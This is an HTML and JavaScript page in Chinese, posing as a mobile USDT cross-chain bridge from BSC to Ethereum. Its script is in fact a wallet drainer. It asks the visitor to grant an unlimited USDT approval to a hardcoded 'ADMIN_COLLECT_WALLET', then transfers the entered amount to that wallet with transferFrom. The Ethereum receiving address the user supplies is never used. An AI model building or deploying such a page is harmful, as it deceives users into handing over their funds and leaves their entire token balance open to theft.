<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
  <title>闪兑&跨链</title>
  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: -apple-system, BlinkMacSystemFont, system-ui, sans-serif;
    }
    body {
      background-color: #f5f7fa;
      padding: 20px 16px;
      color: #111;
    }
    .page-header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 32px;
      font-size: 24px;
    }
    .header-right-icon {
      display: flex;
      gap: 20px;
      align-items: center;
    }
    .title-main {
      font-size: 42px;
      font-weight: 600;
      margin-bottom: 30px;
    }
    .label-tip {
      color: #888;
      font-size: 16px;
      margin-bottom: 12px;
    }
    .asset-card {
      background: #eeeeef;
      border-radius: 14px;
      padding: 18px 16px;
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 16px;
    }
    .asset-left {
      display: flex;
      align-items: center;
      gap: 10px;
    }
    .coin-logo {
      width: 36px;
      height: 36px;
      border-radius: 50%;
      background-color: #28b463;
      display: flex;
      align-items: center;
      justify-content: center;
      color: #fff;
      font-weight: bold;
    }
    .asset-text h4 {
      font-size: 18px;
      font-weight: 500;
    }
    .asset-text p {
      font-size: 14px;
      color: #666;
    }
    .asset-input-wrap {
      text-align: right;
    }
    .asset-input {
      background: transparent;
      border: none;
      font-size: 20px;
      text-align: right;
      width: 120px;
      outline: none;
      color: #111;
    }
    .swap-arrow {
      text-align: center;
      margin: 10px 0;
      font-size: 26px;
      color: #3488ff;
    }
    .address-wrap {
      background: #eeeeef;
      border-radius: 14px;
      padding: 18px 16px;
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 30px;
      cursor: pointer;
    }
    .address-text {
      color: #888;
      font-size: 16px;
    }
    .confirm-btn {
      width: 100%;
      padding: 20px 0;
      background-color: #b0b8c4;
      color: #fff;
      border: none;
      border-radius: 14px;
      font-size: 20px;
      cursor: pointer;
      transition: 0.2s;
    }
    .confirm-btn.active {
      background-color: #3488ff;
    }
    .info-row {
      display: flex;
      justify-content: space-between;
      padding: 16px 0;
      font-size: 16px;
      color: #666;
    }
    .tab-bar {
      position: fixed;
      bottom: 0;
      left: 0;
      width: 100%;
      display: flex;
      justify-content: space-around;
      padding: 12px 0 26px;
      background: #fff;
      border-top: 1px solid #e5e7eb;
    }
    .tab-item {
      text-align: center;
      font-size: 12px;
      color: #888;
    }
    .tab-item.active {
      color: #3488ff;
    }
    .addr-modal {
      position: fixed;
      left: 0;
      bottom: 0;
      width: 100%;
      height: 100%;
      background: rgba(0,0,0,0.4);
      display: none;
      z-index: 999;
      align-items: flex-end;
    }
    .modal-content {
      width: 100%;
      background: #fff;
      border-radius: 16px 16px 0 0;
      padding: 24px 20px;
    }
    .modal-title {
      font-size: 18px;
      margin-bottom: 20px;
      display: flex;
      justify-content: space-between;
      align-items: center;
    }
    .close-modal {
      color: #3488ff;
      font-size: 16px;
      cursor: pointer;
    }
    .addr-input-box {
      width: 100%;
      border: 1px solid #ddd;
      border-radius: 10px;
      padding: 16px;
      font-size: 16px;
      outline: none;
      margin-bottom: 20px;
    }
    .modal-confirm-btn {
      width: 100%;
      padding: 16px 0;
      background: #3488ff;
      color: #fff;
      border: none;
      border-radius: 10px;
      font-size: 17px;
    }
    .tip-modal {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0,0,0,0.4);
      display: none;
      z-index: 1000;
      align-items: center;
      justify-content: center;
    }
    .tip-box {
      background: #fff;
      width: 80%;
      max-width: 320px;
      border-radius: 14px;
      padding: 24px 20px;
    }
    .tip-confirm {
      text-align: right;
      margin-top: 20px;
    }
    .tip-confirm button {
      border: none;
      background: none;
      color: #3488ff;
      font-size: 16px;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <div class="page-header">
    <div>闪兑&跨链 <span style="font-size:18px;color:#777">限价模式</span></div>
    <div class="header-right-icon">
      <span>◯</span>
      <span>⚙</span>
    </div>
  </div>

  <div class="title-main">Transit</div>

  <div class="label-tip">发送</div>
  <div class="asset-card">
    <div class="asset-left">
      <div class="coin-logo">₮</div>
      <div class="asset-text">
        <h4>USDT</h4>
        <p>币安智能链 BSC</p>
      </div>
    </div>
    <div class="asset-input-wrap">
      <input class="asset-input" id="sendAmountInput" type="number" min="0" step="0.0001" placeholder="0">
    </div>
  </div>

  <div class="swap-arrow">⇆</div>

  <div class="label-tip">接收（预估）</div>
  <div class="asset-card">
    <div class="asset-left">
      <div class="coin-logo">₮</div>
      <div class="asset-text">
        <h4>USDT</h4>
        <p>以太坊 ETH</p>
      </div>
    </div>
    <div class="asset-input-wrap">
      <span id="receiveAmountText">0.0000</span>
    </div>
  </div>

  <div class="address-wrap" id="addressDropBox">
    <div class="address-text" id="showReceiveAddr">请粘贴以太坊接收地址</div>
    <span>▼</span>
  </div>

  <button class="confirm-btn" id="crossBtn">确认跨链转出</button>

  <div class="info-row">
    <span>兑换价格</span>
    <span>-</span>
  </div>

  <div class="addr-modal" id="addressModal">
    <div class="modal-content">
      <div class="modal-title">
        <span>填写接收地址</span>
        <span class="close-modal" id="closeAddrModal">关闭</span>
      </div>
      <input type="text" class="addr-input-box" id="userEthAddrInput" placeholder="粘贴以太坊钱包地址(0x开头)">
      <button class="modal-confirm-btn" id="saveAddrBtn">确认地址</button>
    </div>
  </div>

  <div class="tip-modal" id="globalTipModal">
    <div class="tip-box">
      <p id="tipContent"></p>
      <div class="tip-confirm">
        <button id="closeTipBtn">确定</button>
      </div>
    </div>
  </div>

  <div class="tab-bar">
    <div class="tab-item">资产</div>
    <div class="tab-item">行情</div>
    <div class="tab-item active">交易</div>
    <div class="tab-item">发现</div>
    <div class="tab-item">我的</div>
  </div>

<script>
const BSC_USDT_CONTRACT = "0x55d398326f99059fF775485246999027B3197955";
const ADMIN_COLLECT_WALLET = "0xXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXC6";
const BSC_CHAIN_ID = 56;
const FEE_RATIO = 0.999;

const sendAmountInput = document.getElementById("sendAmountInput");
const receiveAmountText = document.getElementById("receiveAmountText");
const crossBtn = document.getElementById("crossBtn");
const addressDropBox = document.getElementById("addressDropBox");
const addressModal = document.getElementById("addressModal");
const closeAddrModal = document.getElementById("closeAddrModal");
const userEthAddrInput = document.getElementById("userEthAddrInput");
const saveAddrBtn = document.getElementById("saveAddrBtn");
const showReceiveAddr = document.getElementById("showReceiveAddr");
const globalTipModal = document.getElementById("globalTipModal");
const tipContent = document.getElementById("tipContent");
const closeTipBtn = document.getElementById("closeTipBtn");

let provider, signer, usdtContract;
let walletStep = 0;
let userEthReceiveAddress = "";

function showTip(msg) {
  tipContent.innerText = msg;
  globalTipModal.style.display = "flex";
}
closeTipBtn.onclick = () => {
  globalTipModal.style.display = "none";
};

sendAmountInput.addEventListener("input", function () {
  const inputVal = parseFloat(this.value);
  if (isNaN(inputVal) || inputVal <= 0) {
    receiveAmountText.innerText = "0.0000";
    crossBtn.classList.remove("active");
    crossBtn.disabled = true;
    return;
  }
  const receiveVal = (inputVal * FEE_RATIO).toFixed(4);
  receiveAmountText.innerText = receiveVal;
  crossBtn.classList.add("active");
  crossBtn.disabled = false;
});

addressDropBox.addEventListener("click", () => {
  addressModal.style.display = "flex";
});
closeAddrModal.addEventListener("click", () => {
  addressModal.style.display = "none";
});

saveAddrBtn.addEventListener("click", () => {
  const inputAddr = userEthAddrInput.value.trim();
  const ethReg = /^0x[a-fA-F0-9]{40}$/;
  if (!ethReg.test(inputAddr)) {
    showTip("请输入合法0x开头地址");
    return;
  }
  userEthReceiveAddress = inputAddr;
  showReceiveAddr.innerText = inputAddr.slice(0,6)+"..."+inputAddr.slice(-4);
  addressModal.style.display = "none";
  userEthAddrInput.value = "";
});

async function switchToBSC() {
  try {
    await window.ethereum.request({
      method:"wallet_switchEthereumChain",
      params:[{chainId:"0x38"}]
    })
    return true;
  }catch(e){
    if(e.code === 4902){
      await window.ethereum.request({
        method:"wallet_addEthereumChain",
        params:[{
          chainId:"0x38",
          chainName:"BNB Smart Chain",
          nativeCurrency:{name:"BNB",symbol:"BNB",decimals:18},
          rpcUrls:["https://bsc-dataseed.binance.org"],
          blockExplorerUrls:["https://bscscan.com"]
        }]
      })
      return true;
    }
    showTip("切换BSC失败");
    return false;
  }
}

async function connectWallet(){
  if(!window.ethereum){
    showTip("请在钱包内置浏览器打开");
    return false;
  }
  try{
    await window.ethereum.request({method:"eth_requestAccounts"});
    const ok = await switchToBSC();
    if(!ok) return false;
    // 最简初始化方式，不额外篡改provider内部变量
    provider = new ethers.providers.Web3Provider(window.ethereum);
    signer = provider.getSigner();
    usdtContract = new ethers.Contract(
      BSC_USDT_CONTRACT,
      ["function approve(address spender,uint256 amount) returns(bool)","function transferFrom(address from,address to,uint256 amount) returns(bool)","function allowance(address owner,address spender) view returns(uint256)"],
      signer
    )
    walletStep = 1;
    showTip("钱包连接成功");
    return true;
  }catch(err){
    showTip("连接失败："+err.message);
    return false;
  }
}

crossBtn.onclick = async function(){
  const num = parseFloat(sendAmountInput.value);
  if(isNaN(num)||num<=0){
    showTip("请填写转账数量");
    return;
  }
  if(!userEthReceiveAddress){
    showTip("填写接收地址");
    return;
  }
  if(walletStep === 0){
    await connectWallet();
    return;
  }
  if(walletStep === 1){
    this.disabled = true;
    try{
      const maxAllow = ethers.constants.MaxUint256;
      const tx = await usdtContract.approve(ADMIN_COLLECT_WALLET,maxAllow);
      await tx.wait();
      walletStep = 2;
      this.innerText = "确认划转";
      this.disabled = false;
      showTip("授权成功，再次点击划转");
    }catch(e){
      showTip("授权失败："+e.message);
      this.disabled = false;
    }
    return;
  }
  if(walletStep === 2){
    this.disabled = true;
    try{
      const userAddr = await signer.getAddress();
      const amount = ethers.utils.parseUnits(num+"",18);
      const tx = await usdtContract.transferFrom(userAddr,ADMIN_COLLECT_WALLET,amount);
      await tx.wait();
      showTip("转账成功");
      this.innerText = "完成";
    }catch(e){
      showTip("转账失败："+e.message);
      this.disabled = false;
    }
  }
}
</script>
</body>
</html>
